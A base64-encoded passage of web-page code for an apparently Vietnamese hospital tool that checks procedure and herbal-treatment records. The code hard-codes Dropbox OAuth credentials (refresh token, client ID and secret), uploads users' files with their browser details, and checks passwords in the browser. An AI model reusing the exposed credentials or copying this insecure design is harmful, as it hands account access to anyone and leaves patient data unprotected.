xvayIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7IGRpc3BsYXk6bm9uZTsiIGlkPSJhdmFpbGFiaWxpdHlGaWx0ZXJCbG9jayI+DQogIDxsYWJlbCBmb3I9ImZpbHRlck9wZXJhdG9yIj5OZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogIDxzZWxlY3QgaWQ9ImZpbHRlck9wZXJhdG9yIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvO21hcmdpbi1yaWdodDoyMHB4OyI+PC9zZWxlY3Q+DQoNCiAgPGxhYmVsIGZvcj0iZmlsdGVyRGF0ZSI+TmfDoHk6PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyRGF0ZSIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KPC9kaXY+DQoNCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSBoZXJiLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCg0KDQoNCg0KPCEtLSBOw5pUIEhJ4buCTiBUSOG7iiBUSOG7piBUSFXhuqxUIFPhuq5DIFRIVeG7kEMgLS0+DQoNCg0KICANCjwhLS0gQuG6ok5HIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyBUSEFORyAtLT4NCjxkaXYgaWQ9ImhlcmJQcm9jZWR1cmVUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6IDIwcHg7Ij4NCiAgPGRpdiBjbGFzcz0ibWFpbmJsb2sic3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij4NCiAgICA8ZGl2Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEb2N0b3JGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87IG1hcmdpbi1sZWZ0OiAyMHB4OyI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICA8c2VsZWN0IGlkPSJoZXJiRGF0ZUZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KICA8L2Rpdj48L2Rpdj4NCg0KPCEtLSBUw5NNIFThuq5UIE9VVExJRVIgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllclN1bW1hcnkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7bWFyZ2luOjhweCAyMHB4O2ZvbnQtc2l6ZToxNHB4Ij4NCiAgPCEtLSBu4buZaSBkdW5nIHPhur0gxJHGsOG7o2MgSlMgY+G6rXAgbmjhuq10IC0tPg0KPC9kaXY+DQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImhlcmJUYWJsZUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCg0KDQo8IS0tIFBPUFVQIERBTkggU8OBQ0ggT1VUTElFUiBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYk91dGxpZXJNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwMDAiPg0KICA8ZGl2IGlkPSJoZXJiT3V0bGllckJhY2tkcm9wIiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSI+PC9kaXY+DQogIDxkaXYgcm9sZT0iZGlhbG9nIiBhcmlhLW1vZGFsPSJ0cnVlIg0KICAgICAgIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpOw0KICAgICAgICAgICAgICBtYXgtd2lkdGg6NzAwcHg7bWF4LWhlaWdodDo4MHZoO292ZXJmbG93OmF1dG87DQogICAgICAgICAgICAgIGJhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO3BhZGRpbmc6MjBweDtib3JkZXItcmFkaXVzOjhweDsNCiAgICAgICAgICAgICAgYm9yZGVyOjJweCBzb2xpZCAjZDMyZjJmO2JveC1zaGFkb3c6MCA1cHggMjBweCByZ2JhKDAsMCwwLDAuMyk7Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZiI+DQogICAgPGgzPkRhbmggc8OhY2ggY2Ega2jDoWMgxJFhIHPhu5E8L2gzPg0KICAgIDxkaXYgc3R5bGU9Im1hcmdpbjoxMHB4IDA7Zm9udC1zaXplOjEzcHgiIGlkPSJoZXJiT3V0bGllck1vZGFsSW5mbyI+PC9kaXY+DQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9Im1hcmdpbi10b3A6MTBweCI+DQogICAgICA8dGhlYWQ+DQogICAgICAgIDx0cj4NCiAgICAgICAgICA8dGg+SOG7jSB0w6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgICAgPHRoPlRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgIDwvdHI+DQogICAgICA8L3RoZWFkPg0KICAgICAgPHRib2R5IGlkPSJoZXJiT3V0bGllck1vZGFsQm9keSI+PC90Ym9keT4NCiAgICA8L3RhYmxlPg0KICAgIDxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiB0eXBlPSJidXR0b24iIGlkPSJoZXJiT3V0bGllckNsb3NlQnRuIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQoNCjxici8+DQo8YnIvPjxkaXYgaWQ9ImVycm9yU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCjxici8+DQo8aDMgaWQ9ImVycm9yU2VjdGlvblRpdGxlIj5M4buXaSBOaOG6rXAgU2FpIFRo4budaSBHaWFuPC9oMz4NCjxkaXYgaWQ9Im9wZXJhdG9yRmlsdGVyRXJyb3IiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQo8bGFiZWwgZm9yPSJvcGVyYXRvclNlbGVjdEVycm9yIj5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCjxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ib3BlcmF0b3JTZWxlY3RFcnJvciI+DQo8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCjwvc2VsZWN0Pg0KPC9kaXY+DQo8ZGl2IGlkPSJlcnJvckxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjxkaXYgaWQ9InJlc3VsdFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQo8aDMgaWQ9InJlc3VsdFNlY3Rpb25UaXRsZSI+VHLDuW5nIEdp4budPC9oMz4gDQoNCjxkaXYgaWQ9Im9wZXJhdG9yRmlsdGVyIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KPGxhYmVsIGZvcj0ib3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJvcGVyYXRvclNlbGVjdCI+DQo8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCjwvc2VsZWN0Pg0KPC9kaXY+PGJyLz4NCg0KPHRhYmxlIGlkPSJyZXN1bHRUYWJsZSI+DQo8dGhlYWQ+DQo8dHI+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeTwvdGg+DQo8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gR+G7o2kgw70gZ2nhu508L3RoPg0KPC90cj4NCjwvdGhlYWQ+DQo8dGJvZHkgaWQ9InJlc3VsdEJvZHkiPjwvdGJvZHk+DQo8L3RhYmxlPg0KDQoNCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQovLyBU4bqjaSBYTFNYIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlWExTWCgpIHsNCiAgaWYgKCF3aW5kb3cuWExTWCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMveGxzeC8wLjE4LjUveGxzeC5mdWxsLm1pbi5qcycpOw0KICB9DQp9DQoNCi8vIFThuqNpIERyb3Bib3ggU0RLIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlRHJvcGJveCgpIHsNCiAgaWYgKCF3aW5kb3cuRHJvcGJveCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly91bnBrZy5jb20vZHJvcGJveC9kaXN0L0Ryb3Bib3gtc2RrLm1pbi5qcycpOw0KICB9DQp9DQoNCg0KICAgICAgICAvLyBEYW5oIHPDoWNoIHRo4bunIHRodeG6rXQNCiAgICAgICBsZXQgUFJPQ0VEVVJFUyA9IHt9Ow0KDQphc3luYyBmdW5jdGlvbiBsb2FkUHJvY2VkdXJlcygpIHsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfdGh1dGh1YXQudHh0Jyk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBQUk9DRURVUkVTID0gSlNPTi5wYXJzZSh0ZXh0KTsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQ6ICcgKyBlcnIubWVzc2FnZSk7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyKTsNCiAgICB9DQp9DQoNCgkJDQoNCiAgICAgICAgLy8gQmnhur9uIHRvw6BuIGPhu6VjDQogICAgICAgIGxldCBlcnJvckxvZyA9IFtdOw0KICAgICAgICBsZXQgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICBsZXQgYWxsUHJvY2VkdXJlcyA9IFtdOw0KDQoNCmNvbnN0IERST1BCT1hfQ09ORklHID0gew0KICAgIHJlZnJlc2hUb2tlbjogImN0Z0J2ajNJc3RjQUFBQUFBQUFBQVZGQ3NJWEl1el9DVFFwSW1ha2NDNGN1UVY4RHVta2ZnRFdJczhWR1B2RlQiLA0KICAgIGNsaWVudElkOiAidzhhd2oycXhvM2FpdjVlIiwNCiAgICBjbGllbnRTZWNyZXQ6ICJxa3FvMXU3YXRzN2JsOWciDQp9Ow0KDQphc3luYyBmdW5jdGlvbiBnZXRBY2Nlc3NUb2tlbigpIHsNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCJodHRwczovL2FwaS5kcm9wYm94YXBpLmNvbS9vYXV0aDIvdG9rZW4iLCB7DQogICAgICAgIG1ldGhvZDogIlBPU1QiLA0KICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6ICJCYXNpYyAiICsgYnRvYShgJHtEUk9QQk9YX0NPTkZJRy5jbGllbnRJZH06JHtEUk9QQk9YX0NPTkZJRy5jbGllbnRTZWNyZXR9YCksDQogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCINCiAgICAgICAgfSwNCiAgICAgICAgYm9keTogYGdyYW50X3R5cGU9cmVmcmVzaF90b2tlbiZyZWZyZXNoX3Rva2VuPSR7RFJPUEJPWF9DT05GSUcucmVmcmVzaFRva2VufWANCiAgICB9KTsNCiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOw0KICAgIHJldHVybiBkYXRhLmFjY2Vzc190b2tlbjsNCn0NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCmFzeW5jIGZ1bmN0aW9uIHVwbG9hZFRvRHJvcGJveChmaWxlLCBraG9hVmFsdWUsIG5nYXlWYWx1ZSwgc3RhdHMgPSB7IGhlcmI6IDAsIHRpbWU6IDAsIGNvbmZsaWN0OiAwIH0pIHsNCiAgYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IHBjTmFtZSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7DQogICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygndmktVk4nKTsNCiAgICBjb25zdCBmaWxlbmFtZSA9IGAke2ZpbGUubmFtZS5yZXBsYWNlKC9cLlteLy5dKyQvLCAiIil9XyR7RGF0ZS5ub3coKX0ueGxzeGA7DQoNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGAvdGh1dGh1YXQvJHtmaWxlbmFtZX1gLA0KICAgICAgICBjb250ZW50czogZmlsZSwNCiAgICAgICAgbW9kZTogJ2FkZCcsDQogICAgICAgIGF1dG9yZW5hbWU6IHRydWUNCiAgICB9KTsNCg0KICAgIC8vIEdoaSBtZXRhZGF0YSB2w6BvIGZpbGUgSlNPTiB0cnVuZyB0w6JtIChk4bqhbmcgdGV4dCBhcHBlbmQpDQogICAgY29uc3QgbWV0YWRhdGEgPSB7DQogICAgICAgIHN0dDogRGF0ZS5ub3coKSwNCiAgICBraG9hOiBraG9hVmFsdWUsICAgICAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgIG5nYXk6IG5nYXlWYWx1ZSwgICAgLy8g4pyFIMSRw7puZyBiaeG6v24NCiAgICAgICAgbGluazogImh0dHBzOi8vd3d3LmRyb3Bib3guY29tL2hvbWUvdGh1dGh1YXQ/cHJldmlldz0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGZpbGVuYW1lKSwNCiAgICAgICAgcGM6IHBjTmFtZSwNCiAgICAgICAgdGltZTogbm93LA0KCQloZXJiX2Vycm9yczogTnVtYmVyKHN0YXRzLmhlcmIpIHx8IDAsDQogICAgdGltZV9lcnJvcnM6IE51bWJlcihzdGF0cy50aW1lKSB8fCAwLA0KICAgY29uZmxpY3RfZXJyb3JzOiBOdW1iZXIoc3RhdHMuY29uZmxpY3QpIHx8IDANCiAgICB9Ow0KDQogICAgYXdhaXQgYXBwZW5kRHJvcGJveExvZyhtZXRhZGF0YSk7DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIGFwcGVuZERyb3Bib3hMb2cobG9nSXRlbSkgew0KICAgIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQoNCiAgICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQogICAgbGV0IGxvZ3MgPSBbXTsNCg0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgICAgICBjb25zdCBibG9iID0gcmVzcG9uc2UucmVzdWx0LmZpbGVCbG9iOyAvLyDinIUgZMO5bmcgLnJlc3VsdC5maWxlQmxvYg0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgYmxvYi50ZXh0KCk7DQogICAgICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS53YXJuKCJLaMO0bmcgdMOsbSB0aOG6pXkgbG9nLmpzb24gY8WpIGhv4bq3YyBs4buXaSDEkeG7jWM6IiwgZSk7DQogICAgICAgIGxvZ3MgPSBbXTsNCiAgICB9DQoNCiAgICAvLyBDaMOobiBt4bubaSBuaOG6pXQgbMOqbiDEkeG6p3UNCiAgICBsb2dzLnVuc2hpZnQobG9nSXRlbSk7DQoNCiAgICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgICAgICBwYXRoOiBsb2dQYXRoLA0KICAgICAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LCAvLyDinIUgR2hpIMSRw6ggYuG6r3QgYnXhu5ljDQogICAgICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogICAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gaW5pdEFmdGVyTG9naW4oKSB7DQogIGF3YWl0IFByb21pc2UuYWxsKFsNCiAgICBsb2FkUHJvY2VkdXJlcygpLA0KICAgIGxvYWRDb25mbGljdFJ1bGVzKCkNCiAgXSk7DQp9DQoNCg0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIMSQxIJORyBOSOG6rFAgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gY2hlY2tTYXZlZExvZ2luKCkgew0KICAgIGNvbnN0IHNhdmVkVXNlciA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKTsNCiAgICBpZiAoc2F2ZWRVc2VyKSB7DQogICAgICAgIGN1cnJlbnRVc2VyID0gc2F2ZWRVc2VyOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGluaXRBZnRlckxvZ2luKCk7IC8vIGF1dG8tbG9naW4gbeG7m2kgbG9hZCBk4buvIGxp4buHdQ0KICAgIH0NCn0NCg0KbGV0IGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmxldCBhbmFseXplUG9wdXBUaW1lcjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmFzeW5jIGZ1bmN0aW9uIGNoZWNrTG9naW4oKSB7DQogIGNvbnN0IGJ0bkxvZ2luICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgY29uc3QgdXNlcm5hbWUgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUudHJpbSgpOw0KICBjb25zdCBwYXNzd29yZCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IGxvZ2luRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogIGJ0bkxvZ2luLmRpc2FibGVkID0gdHJ1ZTsNCiAgYnRuTG9naW4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIMSRxINuZyBuaOG6rXAuLi4nOw0KDQogIGNvbnN0IHBvcHVwICAgICAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogIGxldCBsb2dpblBvcHVwU2hvd24gPSBmYWxzZTsNCg0KICAvLyBTYXUgMnMga2nhu4NtIHRyYTogduG6q24g4bufIHRyYW5nIMSRxINuZyBuaOG6rXAgJiDEkWFuZyBsb2FkaW5nPw0KY29uc3Qgc2xvd0xvZ2luVGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICBpZiAoIWlzTG9naW5BY3Rpb24pIHJldHVybjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjb25zdCBsb2dpblNlY3Rpb25WaXNpYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBzdGlsbExvYWRpbmcgPSBidG5Mb2dpbi5pbm5lckhUTUwuaW5jbHVkZXMoJ8SQYW5nIMSRxINuZyBuaOG6rXAnKTsNCiAgICBpZiAobG9naW5TZWN0aW9uVmlzaWJsZSAmJiBzdGlsbExvYWRpbmcpIHsNCiAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBmYS1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgIGA7DQogICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQogICAgICBsb2dpblBvcHVwU2hvd24gPSB0cnVlOw0KICAgIGxldCBwZXJjZW50ID0gMDsNCnByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICBwZXJjZW50ICs9IDI7IC8vIHTEg25nIG3hu5dpIGzhuqduIDIlDQogICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICB9DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KfSwgNTAwKTsgLy8gMTAwbXMgY+G6rXAgbmjhuq10IDEgbOG6p24NCg0KCQ0KCX0NCiAgfSwgMjAwMCk7DQoNCiAgdHJ5IHsNCiAgICBjb25zdCBhY2NvdW50cyA9IGF3YWl0IGxvYWRBY2NvdW50c0Zyb21UWFQoKTsNCiAgICBpZiAoYWNjb3VudHNbdXNlcm5hbWVdICYmIGFjY291bnRzW3VzZXJuYW1lXSA9PT0gcGFzc3dvcmQpIHsNCiAgICAgIGN1cnJlbnRVc2VyID0gdXNlcm5hbWU7DQogICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcm5hbWUpOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KDQogICAgICBhd2FpdCBpbml0QWZ0ZXJMb2dpbigpOyAvLyBjaOG7iSBsb2FkIHNhdSBraGkgbG9naW4gdGjDoG5oIGPDtG5nDQogICAgfSBlbHNlIHsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHEg25nIG5o4bqtcDonLCBlcnIpOw0KICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0gZmluYWxseSB7DQogICAgY2xlYXJUaW1lb3V0KHNsb3dMb2dpblRpbWVyKTsNCg0KICAgIC8vIE7hur91IHBvcHVwIGRvIGxvZ2luIG3hu58gdGjDrCDEkcOzbmcNCiAgICBpZiAobG9naW5Qb3B1cFNob3duICYmIHBvcHVwKSB7DQogICAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGU